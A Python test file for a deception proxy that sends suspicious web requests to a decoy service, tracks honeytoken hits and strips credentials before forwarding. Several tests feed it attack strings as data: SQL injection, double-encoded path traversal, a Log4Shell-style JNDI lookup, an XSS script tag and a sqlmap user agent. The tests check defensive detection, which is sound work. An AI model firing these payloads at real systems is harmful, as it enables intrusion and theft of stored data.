"""Integration tests for real-app and decoy proxy routing decisions."""

from types import SimpleNamespace

from fastapi.responses import JSONResponse
import httpx
import pytest
from starlette.requests import Request

from app.api.routes import proxy as proxy_route
from app.core.config import settings
from app.schemas.decision import Decision
from app.services import honeytoken, proxy_client
from app.services.proxy_client import _request_headers, forward_request
from app.services.traffic_tracker import TrafficTracker, traffic_tracker


@pytest.fixture(autouse=True)
async def clear_proxy_traffic():
    await traffic_tracker.clear()
    yield
    await traffic_tracker.clear()


@pytest.mark.asyncio
async def test_normal_request_is_forwarded_to_real_app(client, monkeypatch):
    captured = {}

    async def fake_forward(request, **kwargs):
        captured.update(kwargs)
        return JSONResponse({"route": "real"})

    monkeypatch.setattr(proxy_route, "forward_request", fake_forward)
    response = await client.get(
        "/api/v1/proxy/api/products",
        headers={"user-agent": "Mozilla/5.0"},
    )

    assert response.status_code == 200
    assert response.json() == {"route": "real"}
    assert captured["upstream_url"] == settings.real_app_url
    assert captured["is_decoy"] is False


@pytest.mark.asyncio
async def test_suspicious_request_is_forwarded_to_decoy(client, monkeypatch):
    captured = {}

    async def fake_forward(request, **kwargs):
        captured.update(kwargs)
        return JSONResponse({"status": "ok"})

    monkeypatch.setattr(proxy_route, "forward_request", fake_forward)
    response = await client.get(
        "/api/v1/proxy/.env",
        headers={"user-agent": "sqlmap/1.8"},
    )

    assert response.status_code == 200
    assert captured["upstream_url"] == settings.decoy_service_url
    assert captured["is_decoy"] is True
    assert captured["decoy_context"]["x-mirage-actor-hint"]
    assert captured["decoy_context"]["x-mirage-risk-score"]


@pytest.mark.asyncio
async def test_payload_signals_can_trigger_decoy_routing(client, monkeypatch):
    captured = {}

    async def fake_forward(request, **kwargs):
        captured.update(kwargs)
        return JSONResponse({"status": "ok"})

    monkeypatch.setattr(proxy_route, "forward_request", fake_forward)
    response = await client.post(
        "/api/v1/proxy/api/admin/import",
        content="../../records UNION SELECT password FROM users",
        headers={"content-type": "text/plain", "authorization": "Bearer real-secret"},
    )

    assert response.status_code == 200
    assert captured["is_decoy"] is True
    assert captured["body"] == b"../../records UNION SELECT password FROM users"


@pytest.mark.asyncio
async def test_proxy_combines_query_and_body_for_feature_extraction(client, monkeypatch):
    captured = {}

    async def fake_inspect(metadata, **_kwargs):
        captured["payload_excerpt"] = metadata.payload_excerpt
        return SimpleNamespace(
            decision=Decision.ALLOW,
            fingerprint_hash="fingerprint",
            risk_score=0.0,
            decoy_type=None,
        )

    async def fake_forward(_request, **_kwargs):
        return JSONResponse({"status": "ok"})

    monkeypatch.setattr(proxy_route, "inspect_and_log", fake_inspect)
    monkeypatch.setattr(proxy_route, "forward_request", fake_forward)

    response = await client.post(
        "/api/v1/proxy/api/search?page=1",
        content="role=admin",
    )

    assert response.status_code == 200
    assert captured["payload_excerpt"] == "page=1\nrole=admin"


@pytest.mark.asyncio
async def test_proxy_body_is_available_for_honeytoken_detection(client, monkeypatch):
    captured = {}

    async def fake_forward(request, **kwargs):
        captured.update(kwargs)
        return JSONResponse({"status": "ok"})

    monkeypatch.setattr(proxy_route, "forward_request", fake_forward)
    monkeypatch.setattr(
        honeytoken,
        "settings",
        type(
            "TestSettings",
            (),
            {
                "decoy_login_token": "mirage-login-canary",
                "decoy_oauth_token": "mirage-oauth-canary",
                "decoy_service_token": "mirage-service-canary",
                "decoy_database_url": "postgresql://decoy.invalid/mirage",
            },
        )(),
    )

    response = await client.post(
        "/api/v1/proxy/api/token/verify",
        content="token=mirage-service-canary",
        headers={"content-type": "text/plain"},
    )
    honeytokens = await client.get("/api/v1/dashboard/honeytokens")

    assert response.status_code == 200
    assert captured["body"] == b"token=mirage-service-canary"
    assert honeytokens.json()["total_hits"] == 1
    assert honeytokens.json()["hits"][0]["token_kind"] == "service_token"


@pytest.mark.parametrize(
    "headers",
    [
        {"authorization": "Bearer mirage-issued-oauth-canary-0123456789ab"},
        {"cookie": "theme=dark; session=mirage-issued-oauth-canary-0123456789ab"},
    ],
)
async def test_proxy_detects_honeytokens_in_request_headers(client, monkeypatch, headers):
    await _route(client, monkeypatch, "GET", "/api/v1/proxy/api/profile", headers=headers)
    honeytokens = await client.get("/api/v1/dashboard/honeytokens")

    assert honeytokens.json()["total_hits"] == 1
    assert honeytokens.json()["hits"][0]["token_kind"] == "oauth_token"


@pytest.mark.asyncio
async def test_proxy_rejects_oversized_body_before_forwarding(client, monkeypatch):
    called = False

    async def fake_forward(request, **kwargs):
        nonlocal called
        called = True
        return JSONResponse({"status": "ok"})

    monkeypatch.setattr(proxy_route, "forward_request", fake_forward)
    response = await client.post(
        "/api/v1/proxy/api/upload",
        content=b"x" * (settings.proxy_max_body_bytes + 1),
    )

    assert response.status_code == 413
    assert called is False


def test_decoy_forwarding_strips_credentials():
    request = Request(
        {
            "type": "http",
            "method": "GET",
            "path": "/",
            "headers": [
                (b"authorization", b"Bearer real-secret"),
                (b"cookie", b"session=real-secret"),
                (b"x-mirage-api-key", b"operator-secret"),
                (b"x-mirage-actor-hint", b"spoofed"),
                (b"user-agent", b"Mozilla/5.0"),
                (b"accept", b"application/json"),
            ],
        }
    )

    decoy_headers = _request_headers(
        request,
        is_decoy=True,
        decoy_context={"x-mirage-actor-hint": "trusted-actor"},
    )
    real_headers = _request_headers(request, is_decoy=False)

    assert "authorization" not in decoy_headers
    assert "cookie" not in decoy_headers
    assert "x-mirage-api-key" not in decoy_headers
    assert decoy_headers["x-mirage-actor-hint"] == "trusted-actor"
    assert decoy_headers["user-agent"] == "Mozilla/5.0"
    assert real_headers["authorization"] == "Bearer real-secret"
    assert "x-mirage-actor-hint" not in real_headers


@pytest.mark.asyncio
async def test_forward_request_preserves_http_semantics(monkeypatch):
    captured = {}

    async def upstream_handler(request: httpx.Request) -> httpx.Response:
        captured["method"] = request.method
        captured["url"] = str(request.url)
        captured["body"] = await request.aread()
        captured["authorization"] = request.headers.get("authorization")
        return httpx.Response(
            201,
            json={"upstream": "real"},
            headers={"x-powered-by": "hidden", "x-app": "demo"},
        )

    transport = httpx.MockTransport(upstream_handler)
    original_client = httpx.AsyncClient

    def client_factory(**kwargs):
        return original_client(transport=transport, **kwargs)

    monkeypatch.setattr(proxy_client.httpx, "AsyncClient", client_factory)
    request = Request(
        {
            "type": "http",
            "method": "POST",
            "path": "/api/v1/proxy/api/orders",
            "query_string": b"page=2",
            "headers": [
                (b"authorization", b"Bearer real-secret"),
                (b"content-type", b"application/json"),
                (b"host", b"gateway.local"),
            ],
        }
    )

    response = await forward_request(
        request,
        upstream_url="http://real-app:8001",
        target_path="api/orders",
        body=b'{"item_id":7}',
        is_decoy=False,
    )

    assert response.status_code == 201
    assert response.body == b'{"upstream":"real"}'
    assert response.headers["x-app"] == "demo"
    assert "x-powered-by" not in response.headers
    assert captured == {
        "method": "POST",
        "url": "http://real-app:8001/api/orders?page=2",
        "body": b'{"item_id":7}',
        "authorization": "Bearer real-secret",
    }


async def test_forward_request_keeps_repeated_response_headers(monkeypatch):
    async def upstream_handler(request: httpx.Request) -> httpx.Response:
        return httpx.Response(
            200,
            headers=[
                ("set-cookie", "session=abc; Path=/; HttpOnly"),
                ("set-cookie", "theme=dark; Path=/"),
                ("server", "hidden"),
                ("location", "http://real-app:8001/next"),
            ],
        )

    transport = httpx.MockTransport(upstream_handler)
    original_client = httpx.AsyncClient
    monkeypatch.setattr(
        proxy_client.httpx,
        "AsyncClient",
        lambda **kwargs: original_client(transport=transport, **kwargs),
    )
    request = Request(
        {"type": "http", "method": "GET", "path": "/x", "query_string": b"", "headers": []}
    )

    response = await forward_request(
        request,
        upstream_url="http://real-app:8001",
        target_path="x",
        body=b"",
        is_decoy=False,
    )

    assert response.headers.getlist("set-cookie") == [
        "session=abc; Path=/; HttpOnly",
        "theme=dark; Path=/",
    ]
    assert "server" not in response.headers
    assert response.headers["location"] == "/api/v1/proxy/next"


@pytest.mark.parametrize(
    "path",
    ["/files/a%2541", "/files/a%2Fb", "/files/report%20final.pdf"],
)
async def test_proxy_forwards_the_raw_encoded_path(client, monkeypatch, path):
    seen = {}

    async def upstream_handler(request: httpx.Request) -> httpx.Response:
        seen["raw_path"] = request.url.raw_path
        return httpx.Response(200)

    transport = httpx.MockTransport(upstream_handler)
    original_client = httpx.AsyncClient
    monkeypatch.setattr(
        proxy_client.httpx,
        "AsyncClient",
        lambda **kwargs: original_client(transport=transport, **kwargs),
    )

    response = await client.get(f"/api/v1/proxy{path}?page=2", headers={"user-agent": BROWSER_UA})

    assert response.status_code == 200
    assert seen["raw_path"] == f"{path}?page=2".encode()


@pytest.mark.asyncio
async def test_traffic_tracker_bounds_distinct_sources():
    tracker = TrafficTracker(max_sources=2)

    await tracker.record("192.0.2.1")
    await tracker.record("192.0.2.2")
    await tracker.record("192.0.2.3")

    assert len(tracker.requests) == 2
    assert "192.0.2.1" not in tracker.requests


async def test_traffic_tracker_sweeps_stale_sources_once_per_window(monkeypatch):
    now = [1000.0]
    tracker = TrafficTracker(window_seconds=60, clock=lambda: now[0])
    sweeps = 0
    original_prune = tracker._prune_sources

    def counting_prune(cutoff: float) -> None:
        nonlocal sweeps
        sweeps += 1
        original_prune(cutoff)

    monkeypatch.setattr(tracker, "_prune_sources", counting_prune)
    for index in range(100):
        await tracker.record(f"192.0.2.{index}")
    assert sweeps == 0

    now[0] += 61
    await tracker.record("198.51.100.1")
    await tracker.record("198.51.100.2")
    assert sweeps == 1
    assert set(tracker.requests) == {"198.51.100.1", "198.51.100.2"}


BROWSER_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0 Safari/537.36"


async def _route(client, monkeypatch, method, url, **kwargs):
    captured = {}

    async def fake_forward(request, **forward_kwargs):
        captured.update(forward_kwargs)
        return JSONResponse({"status": "ok"})

    monkeypatch.setattr(proxy_route, "forward_request", fake_forward)
    headers = {"user-agent": BROWSER_UA, **kwargs.pop("headers", {})}
    response = await client.request(method, url, headers=headers, **kwargs)
    assert response.status_code == 200
    return captured


async def test_plain_sqli_body_reaches_decoy(client, monkeypatch):
    captured = await _route(
        client,
        monkeypatch,
        "POST",
        "/api/v1/proxy/api/products",
        content="id=1' or '1'='1",
        headers={"content-type": "application/x-www-form-urlencoded"},
    )
    assert captured["is_decoy"] is True


async def test_encoded_sqli_query_reaches_decoy(client, monkeypatch):
    captured = await _route(
        client, monkeypatch, "GET", "/api/v1/proxy/api/products?id=1%27%20UNION%20SELECT%201"
    )
    assert captured["is_decoy"] is True


async def test_double_encoded_traversal_reaches_decoy(client, monkeypatch):
    captured = await _route(
        client, monkeypatch, "GET", "/api/v1/proxy/api/files?f=%252e%252e%252fwin.ini"
    )
    assert captured["is_decoy"] is True


async def test_benign_search_reaches_real_app(client, monkeypatch):
    captured = await _route(
        client, monkeypatch, "GET", "/api/v1/proxy/api/products?q=Union+Square"
    )
    assert captured["is_decoy"] is False


async def test_payload_detection_runs_off_the_event_loop(client, monkeypatch):
    calls = []
    original = proxy_route.run_in_threadpool

    async def recording_threadpool(func, *args, **kwargs):
        calls.append(func.__name__)
        return await original(func, *args, **kwargs)

    monkeypatch.setattr(proxy_route, "run_in_threadpool", recording_threadpool)
    await _route(client, monkeypatch, "POST", "/api/v1/proxy/api/products", content="x" * 1000)
    assert "detect_payload_indicators" in calls


async def test_proxy_logs_forwarded_client_ip(client, monkeypatch):
    import dataclasses

    from app.core import config

    monkeypatch.setattr(
        config,
        "settings",
        dataclasses.replace(config.settings, trusted_proxies="127.0.0.0/8"),
    )
    captured = {}

    async def fake_inspect(metadata, **_kwargs):
        captured["ip"] = metadata.ip_address
        return SimpleNamespace(
            decision=Decision.ALLOW,
            fingerprint_hash="fingerprint",
            risk_score=0.0,
            decoy_type=None,
        )

    async def fake_forward(_request, **_kwargs):
        return JSONResponse({"status": "ok"})

    monkeypatch.setattr(proxy_route, "inspect_and_log", fake_inspect)
    monkeypatch.setattr(proxy_route, "forward_request", fake_forward)
    response = await client.get(
        "/api/v1/proxy/api/products",
        headers={"x-forwarded-for": "203.0.113.9"},
    )

    assert response.status_code == 200
    assert captured["ip"] == "203.0.113.9"


async def test_exempt_route_reaches_real_app_and_records_exemption(client, monkeypatch):
    import dataclasses

    from app.core import config
    from app.storage import store

    monkeypatch.setattr(
        config,
        "settings",
        dataclasses.replace(config.settings, payload_exemptions="POST /api/posts:xss"),
    )
    body = "<script>alert(1)</script>"

    captured = await _route(client, monkeypatch, "POST", "/api/v1/proxy/api/posts", content=body)
    assert captured["is_decoy"] is False
    event = (await store.get_recent_events(limit=1))[0]
    assert event.summary.endswith("; exempted: xss")
    assert event.feature_vector["high_risk_indicator_count"] == 0

    captured = await _route(
        client, monkeypatch, "POST", "/api/v1/proxy/api/comments", content=body
    )
    assert captured["is_decoy"] is True


@pytest.mark.parametrize("header", ["user-agent", "referer"])
async def test_attack_in_user_agent_or_referer_reaches_decoy(client, monkeypatch, header):
    captured = await _route(
        client,
        monkeypatch,
        "GET",
        "/api/v1/proxy/api/products",
        headers={header: "${jndi:ldap://x/a}"},
    )
    assert captured["is_decoy"] is True


async def test_oversized_user_agent_and_path_are_routed_and_logged(client, monkeypatch):
    from app.storage import store

    long_path = "/api/products/" + "a" * 3000
    captured = await _route(
        client,
        monkeypatch,
        "GET",
        "/api/v1/proxy" + long_path,
        headers={"user-agent": "Mozilla/5.0 " + "x" * 600},
    )
    assert captured["is_decoy"] is False
    # The upstream still receives the complete path.
    assert captured["target_path"] == long_path.lstrip("/")
    event = (await store.get_recent_events(limit=1))[0]
    assert event.path == long_path[:512]

    captured = await _route(
        client,
        monkeypatch,
        "GET",
        "/api/v1/proxy/.env/" + "b" * 3000,
        headers={"user-agent": "sqlmap/1.8 " + "x" * 600},
    )
    assert captured["is_decoy"] is True
    alert = (await store.get_alerts(limit=1))[0]
    assert alert.title.startswith("Decoy redirect: /.env/")
    assert len(alert.title) <= 256


@pytest.mark.parametrize(
    "decoy_body,expected_kinds",
    [
        ({"access_token": "mirage-issued-oauth-canary-0123456789ab"}, ["oauth_token"]),
        ({"status": "ok"}, []),
    ],
)
async def test_proxy_records_the_canary_tokens_the_decoy_returned(
    client, monkeypatch, decoy_body, expected_kinds
):
    import hashlib

    from app.storage import store

    async def fake_forward(_request, **_kwargs):
        return JSONResponse(decoy_body)

    monkeypatch.setattr(proxy_route, "forward_request", fake_forward)
    response = await client.get("/api/v1/proxy/.env", headers={"user-agent": "sqlmap/1.8"})

    assert response.status_code == 200
    assignments = await store.get_canary_assignments()
    assert [item.token_kind for item in assignments] == expected_kinds
    if expected_kinds:
        token = decoy_body["access_token"]
        assert assignments[0].token_hash == hashlib.sha256(token.encode()).hexdigest()
        assert assignments[0].source_path == "/.env"


async def test_concurrent_requests_from_one_actor_are_all_logged(client, monkeypatch):
    import asyncio

    from app.services.actor_profiles import get_actor_profiles
    from app.storage import store

    async def fake_forward(_request, **_kwargs):
        await asyncio.sleep(0.05)  # upstream latency lines the requests up
        return JSONResponse({"secret_key": "mirage-issued-service-canary-0123456789ab"})

    monkeypatch.setattr(proxy_route, "forward_request", fake_forward)
    responses = await asyncio.gather(
        *(
            client.get(
                f"/api/v1/proxy/.env/{index}",
                headers={"user-agent": "sqlmap/1.8"},
            )
            for index in range(20)
        )
    )

    assert [response.status_code for response in responses] == [200] * 20
    assert await store.get_total_requests() == 20
    profiles = (await get_actor_profiles(limit=5)).profiles
    assert [profile.request_count for profile in profiles] == [20]
    assert len(await store.get_canary_assignments()) == 1


async def test_path_exemption_does_not_cover_attacks_in_headers(client, monkeypatch):
    import dataclasses

    from app.core import config

    monkeypatch.setattr(
        config,
        "settings",
        dataclasses.replace(config.settings, payload_exemptions="POST /api/posts:sql-like"),
    )
    captured = await _route(
        client,
        monkeypatch,
        "POST",
        "/api/v1/proxy/api/posts",
        content="hello",
        headers={"user-agent": "x' UNION SELECT password FROM users--"},
    )
    assert captured["is_decoy"] is True


def test_header_credentials_never_appear_in_repr_or_json():
    from app.schemas.request import InspectRequest

    request = InspectRequest(
        ip_address="198.51.100.1", method="GET", path="/", header_text="Bearer SECRET"
    )
    assert "SECRET" not in repr(request)
    assert "SECRET" not in request.model_dump_json()
